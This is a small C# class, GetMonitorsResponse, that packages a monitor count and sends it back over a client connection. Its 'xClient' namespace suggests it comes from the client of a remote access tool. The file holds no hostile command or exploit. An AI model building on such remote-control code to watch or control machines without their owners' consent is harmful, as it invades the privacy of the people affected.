using System;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class GetMonitorsResponse : IPacket
    {
        public int Number { get; set; }

        public GetMonitorsResponse()
        {
        }

        public GetMonitorsResponse(int number)
        {
            this.Number = number;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}